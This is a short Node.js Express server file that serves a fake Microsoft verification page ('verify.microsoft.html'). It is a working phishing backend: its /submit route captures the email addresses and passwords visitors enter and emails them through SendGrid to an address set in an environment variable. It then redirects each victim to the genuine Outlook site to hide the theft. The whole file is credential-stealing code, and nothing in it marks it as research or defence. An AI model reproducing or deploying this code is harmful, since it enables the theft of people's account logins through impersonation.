console.log('SENDGRID_API_KEY:', process.env.SENDGRID_API_KEY?.substring(0,4));
console.log('RECEIVER_EMAIL:', process.env.RECEIVER_EMAIL);
require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const sgMail = require('@sendgrid/mail');
const path = require('path');

const app = express();
const port = 3000;

sgMail.setApiKey(process.env.SENDGRID_API_KEY);

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'verify.microsoft.html'));
});

app.post('/submit', (req, res) => {
  const { email, password } = req.body;

  const msg = {
    to: process.env.RECEIVER_EMAIL,
    from: process.env.RECEIVER_EMAIL,
    subject: 'New Login Submission',
    text: `Email: ${email}\nPassword: ${password}`,
  };

  sgMail.send(msg)
    .then(() => res.redirect('https://outlook.office365.com'))
    .catch(error => {
      console.error(error);
      res.status(500).send('Error sending email.');
    });
});

app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
